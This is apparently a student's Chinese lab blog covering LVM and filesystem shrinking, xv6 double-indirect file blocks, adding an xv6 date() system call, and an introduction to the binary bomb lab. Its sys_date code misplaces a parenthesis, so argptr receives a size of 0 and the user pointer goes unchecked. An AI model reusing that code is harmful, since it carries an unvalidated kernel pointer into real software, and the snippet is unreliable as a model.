<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo rm bigfile2 bigfile3</span><br><span class="line">[sudo] yjn 的密码： </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls</span><br><span class="line">bigfile1  lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ <span class="built_in">cd</span> </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo umount /home/yjn/OS/data </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo e2fsck -f /dev/vg00/lv00 </span><br><span class="line">e2fsck 1.42.13 (17-May-2015)</span><br><span class="line">第一步: 检查inode,块,和大小</span><br><span class="line">第二步: 检查目录结构</span><br><span class="line">第3步: 检查目录连接性</span><br><span class="line">Pass 4: Checking reference counts</span><br><span class="line">第5步: 检查簇概要信息</span><br><span class="line">/dev/vg00/lv00: 12/1015808 files (0.0% non-contiguous), 2200073/4063232 blocks</span><br></pre></td></tr></table></figure>

<h5 id="缩小文件系统以及逻辑卷"><a href="#缩小文件系统以及逻辑卷" class="headerlink" title="缩小文件系统以及逻辑卷"></a>缩小文件系统以及逻辑卷</h5><p>缩小文件系统时, 我再次遇到了问题 :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo resize2fs /dev/vg00/lv00 10G</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">resize2fs: New size smaller than minimum (2660232)</span><br></pre></td></tr></table></figure>


<p>我也头一次听说原来文件系统是有最小值的.</p>
<p>那么, 根据它的最小值提示, 经过计算应约为10.14G大小.</p>
<p>在使用 resize2fs 工具时可以加上选项 -M, 就会将文件系统直接缩小到最小值.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo resize2fs -M /dev/vg00/lv00</span><br><span class="line">resize2fs 1.42.13 (17-May-2015)</span><br><span class="line">Resizing the filesystem on /dev/vg00/lv00 to 2660232 (4k) blocks.</span><br><span class="line">The filesystem on /dev/vg00/lv00 is now 2660232 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo lvreduce -L 11G /dev/vg00/lv00</span><br><span class="line">  WARNING: Reducing active logical volume to 11.00 GiB.</span><br><span class="line">  THIS MAY DESTROY YOUR DATA (filesystem etc.)</span><br><span class="line">Do you really want to reduce vg00/lv00? [y/n]: y</span><br><span class="line">  Size of logical volume vg00/lv00 changed from 15.50 GiB (3968 extents) to 11.00 GiB (2816 extents).</span><br><span class="line">  Logical volume vg00/lv00 successfully resized.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ sudo mount /dev/vg00/lv00 /home/yjn/OS/data/</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~$ df -h /home/yjn/OS/data/</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">/dev/mapper/vg00-lv00  9.9G  8.1G  1.4G   86% /home/yjn/OS/data</span><br><span class="line">yjn@yjn-virtual-machine:~$</span><br></pre></td></tr></table></figure>

<h3 id="bigger-files-for-xv6"><a href="#bigger-files-for-xv6" class="headerlink" title="bigger files for xv6"></a>bigger files for xv6</h3><p><a href="https://pdos.csail.mit.edu/6.828/2018/homework/xv6-big-files.html" target="_blank" rel="noopener">MIT 作业要求</a></p>
<h4 id="关于实验的一些概括性描述"><a href="#关于实验的一些概括性描述" class="headerlink" title="关于实验的一些概括性描述"></a>关于实验的一些概括性描述</h4><ul>
<li>实验目标 : 增加 xv6 文件的最大大小由约 70kB 到约 8.5MB.</li>
<li>实验环境 : Ubuntu 16.04 TLS</li>
<li>大体思路 :<br>xv6文件最大大小为 70KB 的原因是其 inode 包含12个 “直接” 指针和一个 “单一间接” 指针.<br>而xv6的每个数据块为 512B, 所以间接指针指向了共 512/4 = 128 个二级指针. 这样就总共有 128 + 12 = 140 个指针.<br>又因为每个指针都指向了一个512B大小的数据块. 所以就有 140 * 512 = 71680 B = 70KB 大小的文件.<br>那么要怎么实现增大最大大小呢?<br>只需要修改 <code>fs.c</code> 这个文件中的<code>bmap()</code>, 来实现原来的第十二个指针由直接指针改成一级间接指针, 原来的第十三个指针由一级间接指针改成二级间接指针.<br>这样, 指针的总数就是 11 + 128 + 128*128 = 16523 个, 它们指向的数据块的总大小就是 16523 * 512 = 8459776 B = 8.4 MB</li>
</ul>
<h4 id="安装-“big-工具”"><a href="#安装-“big-工具”" class="headerlink" title="安装 “big 工具”"></a>安装 “big 工具”</h4><p>在这次实验中, 需要一个能验证文件大小的方法. 所以这里需要做一些前期工作.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/preliminaries.png" alt title class>
                <p></p>
            </figure>

<ol>
<li><p>在 <code>Makefile</code> 中修改<code>CPUS := 2</code> 为 <code>CPUS := 1</code>, 并在<code>QEMUOPTS</code>的前一行加入<code>QEMUEXTRA = -snapshot</code>.</p>
</li>
<li><p>修改 <code>param.h</code> 中的参数<code>FSSIZE</code>为<br><code>#define FSSIZE       20000  // size of file system in blocks</code></p>
</li>
<li><p>下载 <a href="https://pdos.csail.mit.edu/6.828/2018/homework/big.c" target="_blank" rel="noopener">big.c</a> 至 xv6 目录, 并在 Makefile 文件的 UPROGS 列表的末尾加入<code>_big\</code>.</p>
</li>
<li><p>在 xv6 目录输入 <code>make qemu</code> 编译并运行 xv6. 输入 big ,若显示140个blocks则表明成功.</p>
</li>
</ol>
<h4 id="分析原fs-c文件中的代码"><a href="#分析原fs-c文件中的代码" class="headerlink" title="分析原fs.c文件中的代码"></a>分析原<code>fs.c文件</code>中的代码</h4><p>要想在原xv6的基础修改并实现我们的功能, 必须要先读懂原来的代码.</p>
<p>头一次发现 C语言 的代码是如此晦涩难懂.</p>
<p>这里先附上<code>fs.c</code>中的<code>bmap()</code>的代码以及我的注释.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bmap() 返回 第 bn 个数据块的位置</span></span><br><span class="line"><span class="keyword">static</span> uint </span><br><span class="line">bmap(struct inode *ip, uint bn)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ip 是inode * 实例, 也就是我们将要读取的文件的inode指针</span></span><br><span class="line">  </span><br><span class="line">  uint addr, *a;  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp</span>;</span></span><br><span class="line">  <span class="comment">// 这里的 NDIRECT = 12, 也就是直接指针的个数.</span></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDIRECT)&#123;</span><br><span class="line">    <span class="comment">// 如果 bn &lt; NDIRECT, 说明查询直接指针所指向的数据块.</span></span><br><span class="line">    <span class="comment">// 因为 是直接指针, 所以指针是被保存在inode中的, 所以可以通过inode *ip直接访问.</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      <span class="comment">// dev 是 inode 中保存的设备的号码, 我估计应该是磁盘(储存设备)的设备代码)</span></span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bn -= NDIRECT;</span><br><span class="line">  <span class="comment">// NINDIRECT = BSIZE / sizeof(uint);</span></span><br><span class="line">  <span class="comment">// BSIZE = 512;</span></span><br><span class="line">  <span class="comment">// 所以 NINDIRECT = 512 / 4 = 128</span></span><br><span class="line">  <span class="comment">// 在结合之前的 bn -= NDIRECT, 此时的bn 含义成了一级间接指针的个数</span></span><br><span class="line">  <span class="comment">// 只要 bn &lt; NINDIRECT , 即可读取.</span></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>) </span><br><span class="line">      <span class="comment">// 如果 间接指针是空的, 我们就给它分配一个.</span></span><br><span class="line">      ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="comment">// bp 是缓冲变量, 相当于第13个指针的内容.</span></span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    <span class="comment">// a 是 间接指针所指向的地址的数组.</span></span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// 根据bmap()函数的意义, 我们只读取a[bn]即可.</span></span><br><span class="line">      a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    brelse(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// bn &gt;= NINDIRECT, 已经超过最大文件大小了.</span></span><br><span class="line">  </span><br><span class="line">  panic(<span class="string">"bmap: out of range"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过漫长的阅读, 基本确定了这个函数的作用是返回第 bn 个数据块的地址. </p>
<p>其中的两个if分别代表读取直接指针指向的数据块和间接指针指向数据块的地址的两种情况.</p>
<p>如果这两种情况都不满足, 就说明文件过大而执行最后的报错语句.</p>
<h4 id="重写-bmap-函数"><a href="#重写-bmap-函数" class="headerlink" title="重写 bmap()函数"></a>重写 <code>bmap()</code>函数</h4><p>其实如果刚才的代码看懂了的话, 下面的工作就是照葫芦画瓢, 很简单.</p>
<p>我也分情况分别贴出代码.</p>
<ul>
<li>访问直接指针的数据块时.<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(bn &lt; NDIRECT)&#123;  <span class="comment">// 在fs.h中将这里修改为 11</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这是最简单的情况, 只是将常量修改了.</p>
<ul>
<li>访问一级指针所指向的数据块时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bn -= NDIRECT;</span><br><span class="line"><span class="keyword">if</span>(bn &lt; NINDIRECT)&#123;</span><br><span class="line">  <span class="comment">// Load indirect block, allocating if necessary.</span></span><br><span class="line">  <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>)</span><br><span class="line">    ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">  bp = bread(ip-&gt;dev, addr);</span><br><span class="line">  a = (uint*)bp-&gt;data;</span><br><span class="line">  <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>)&#123;</span><br><span class="line">    a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">  &#125;</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>因为需要修改的常量已经在宏定义中改好了, 这段代码完全不需要改动.</p>
<ul>
<li>访问二级指针指向的数据块时<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bn -= NINDIRECT;</span><br><span class="line"><span class="keyword">if</span>(bn &lt; <span class="number">128</span>*<span class="number">128</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>((addr = ip-&gt;addrs[<span class="number">12</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    ip-&gt;addrs[<span class="number">12</span>] = addr = balloc(ip-&gt;dev);</span><br><span class="line">  &#125;</span><br><span class="line">  bp = bread(ip -&gt;dev, addr); <span class="comment">//读出第13个指针的内容.</span></span><br><span class="line">  a = (uint*)bp-&gt;data;</span><br><span class="line">  </span><br><span class="line">  uint aaddr, *aa;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bbp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((aaddr = a[bn/<span class="number">128</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//先读第一级间接指针.</span></span><br><span class="line">    a[bn/<span class="number">128</span>] = aaddr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bp);</span><br><span class="line">    &#125;</span><br><span class="line">  bbp = bread(ip-&gt;dev, aaddr);</span><br><span class="line">  aa = (uint*)bbp-&gt;data;</span><br><span class="line">  <span class="keyword">if</span>((aaddr = aa[bn % <span class="number">128</span>]) == <span class="number">0</span>)&#123;</span><br><span class="line">    aa[bn % <span class="number">128</span>] = aaddr = balloc(ip-&gt;dev);</span><br><span class="line">    log_write(bbp);</span><br><span class="line">  &#125;</span><br><span class="line">  brelse(bbp);</span><br><span class="line">  brelse(bp);</span><br><span class="line">  <span class="keyword">return</span> aaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里才是真正需要我们发挥的地方.</p>
<p>首先还是先将128个一级数据块减去 (为了清晰直观, 我没有使用常量而是128) , </p>
<p>然后判断inode里的第13个指针是否为空, 如果为空就分配一个.</p>
<p>利用 <code>bn / 128</code> 算出 bn 在第几个二级指针中.</p>
<p>再判断这个二级指针是否为空, 如果为空就分配一个.</p>
<p>再利用 <code>bn % 128</code> 算出 bn 再第几个三级指针中, </p>
<p>判断是否为空, 如果为空就为此三级指针分配地址, 最后函数返回的也是此三级指针的值.</p>
<p>除此之外, <code>log_write()</code>函数的作用可能是记录文件的变更, <code>brelse()</code>估计是类似析构函数的释放地址空间的作用.</p>
<p>别忘了在 fs.h 中修改几个常量的值.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~~~</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NDIRECT 11</span></span><br><span class="line">~~~</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXFILE (NDIRECT + NINDIRECT + NINDIRECT*NINDIRECT )</span></span><br><span class="line">~~~</span><br><span class="line">uint addrs[NDIRECT+<span class="number">2</span>];   <span class="comment">// Data block addresses</span></span><br></pre></td></tr></table></figure>

<p>修改好这两个文件后, 重新编译<code>make qemu</code>.</p>
<p>输入big命令, 得到如下结果即为成功.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/xv6.png" alt title class>
                <p></p>
            </figure>

<p>总的来说算是一次简单的实验了…</p>
<p>完.</p>
<h3 id="xv6-system-calls"><a href="#xv6-system-calls" class="headerlink" title="xv6 system calls"></a>xv6 system calls</h3><p><a href="https://pdos.csail.mit.edu/6.828/2018/homework/xv6-syscall.html" target="_blank" rel="noopener">MIT作业要求</a></p>
<ul>
<li>实验目的 : 增加一个新的系统调用函数 <code>date()</code></li>
</ul>
<h4 id="显示系统调用"><a href="#显示系统调用" class="headerlink" title="显示系统调用"></a>显示系统调用</h4><p>根据提示, 找到 <code>syscall.c</code> 中的 <code>syscall()</code>函数.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">curproc</span> = <span class="title">myproc</span>();</span></span><br><span class="line"></span><br><span class="line">  num = curproc-&gt;tf-&gt;eax;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 这里通过 syscall.h 中的宏定义实现由 num 到相应系统调用的映射.</span></span><br><span class="line">    curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cprintf(<span class="string">"%d %s: unknown sys call %d\n"</span>,</span><br><span class="line">            curproc-&gt;pid, curproc-&gt;name, num);</span><br><span class="line">    curproc-&gt;tf-&gt;eax = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想在系统调用时打印相关信息, 也模仿 else 中的语句就可以.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个char* 数组</span></span><br><span class="line"><span class="keyword">char</span>* syscallName[] = &#123;</span><br><span class="line">  <span class="string">"null"</span>,</span><br><span class="line">  <span class="string">"fork"</span>,</span><br><span class="line">  <span class="string">"exit"</span>,</span><br><span class="line">  <span class="string">"wait"</span>,</span><br><span class="line">  <span class="string">"pipe"</span>,</span><br><span class="line">  <span class="string">"read"</span>,</span><br><span class="line">  <span class="string">"kill"</span>,</span><br><span class="line">  <span class="string">"exec"</span>,</span><br><span class="line">  <span class="string">"fstat"</span>,</span><br><span class="line">  <span class="string">"chdir"</span>,</span><br><span class="line">  <span class="string">"dup"</span>,</span><br><span class="line">  <span class="string">"getpid"</span>,</span><br><span class="line">  <span class="string">"sbrk"</span>,</span><br><span class="line">  <span class="string">"sleep"</span>,</span><br><span class="line">  <span class="string">"uptime"</span>,</span><br><span class="line">  <span class="string">"open"</span>,</span><br><span class="line">  <span class="string">"write"</span>,</span><br><span class="line">  <span class="string">"mknod"</span>,</span><br><span class="line">  <span class="string">"unlink"</span>,</span><br><span class="line">  <span class="string">"link"</span>,</span><br><span class="line">  <span class="string">"mkdir"</span>,</span><br><span class="line">  <span class="string">"close"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    <span class="comment">// 这里通过 syscall.h 中的宏定义实现由 num 到相应系统调用的映射.</span></span><br><span class="line">    cprintf(<span class="string">"%s -&gt; %d\n"</span>,syscallName[num],num);</span><br><span class="line">    curproc-&gt;tf-&gt;eax = syscalls[num]();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/syscall.png" alt title class>
                <p></p>
            </figure>

<p>如图应该是成功了, 但我不知道为啥和MIT里的编号不同. </p>
<h4 id="Date-system-call"><a href="#Date-system-call" class="headerlink" title="Date system call"></a>Date system call</h4><p>下一步就该建立我们的<code>date()</code>函数了.</p>
<p>使用命令找出需要修改的几个地方:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/yjn/xv6-public$ grep -n uptime *.[chS]</span><br><span class="line">syscall.c:106:extern int sys_uptime(void);</span><br><span class="line">syscall.c:125:  <span class="string">"uptime"</span>,</span><br><span class="line">syscall.c:150:[SYS_uptime]  sys_uptime,</span><br><span class="line">syscall.h:15:<span class="comment">#define SYS_uptime 14</span></span><br><span class="line">sysproc.c:83:sys_uptime(void)</span><br><span class="line">user.h:25:int uptime(void);</span><br><span class="line">usys.S:31:SYSCALL(uptime)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>syscall.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_date</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面是简略写法:</span></span><br><span class="line"><span class="keyword">char</span>* syscallName[] :</span><br><span class="line">  <span class="string">"date"</span></span><br><span class="line"><span class="comment">// 下面是简略写法:</span></span><br><span class="line">static int (*syscalls[])(void) :</span><br><span class="line">  [SYS_date]    sys_date</span><br></pre></td></tr></table></figure>
</li>
<li><p>syscall.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_date   22</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>sysproc.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> </span><br><span class="line">sys_date(<span class="keyword">void</span>)&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> *<span class="title">r</span>;</span></span><br><span class="line">  <span class="keyword">if</span>(argptr(<span class="number">0</span>, (<span class="keyword">void</span>*)&amp;r, <span class="keyword">sizeof</span>(*r) &lt; <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">  cmostime(r);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>user.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">date</span><span class="params">(struct rtcdate*)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>usys.S</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL(date)</span><br><span class="line">``` </span><br><span class="line">还有需要一个程序来调用`date()`以验证效果.</span><br><span class="line">+ date.c</span><br><span class="line">```c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"types.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"user.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"date.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rtcdate</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (date(&amp;r)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">2</span>, <span class="string">"date failed\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// your code to print the time in any format you like...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1</span>, <span class="string">"%d/%d/%d-%d:%d:%d"</span>,r.year, r.month, r.day, r.hour, r.minute, r.second);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>最后不要忘了在<code>Makefile</code>里加上 date 这个程序.</p>
<p>效果: <figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/date.png" alt title class>
                <p></p>
            </figure></p>
<h2 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h2><h3 id="bomb-从零开始的汇编世界之旅"><a href="#bomb-从零开始的汇编世界之旅" class="headerlink" title="bomb(从零开始的汇编世界之旅)"></a>bomb(从零开始的汇编世界之旅)</h3><p>这个实验我 tm 吹爆. </p>
<p>我有预感, 这会是我迈入 <code>reverse</code> 和 <code>pwn</code> 的第一个阶梯.</p>
<ul>
<li>实验简介 : 给你一个<a href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/bomb" target="_blank" rel="noopener">bomb程序</a>, 需要你连续输入六个密码才能阻止引爆. 你需要做的就是通过反编译这个程序破译出6个密码.</li>
</ul>
<p>同时, 题目也给出了main函数的代码, 让玩家可以对整体的框架有个了解.</p>
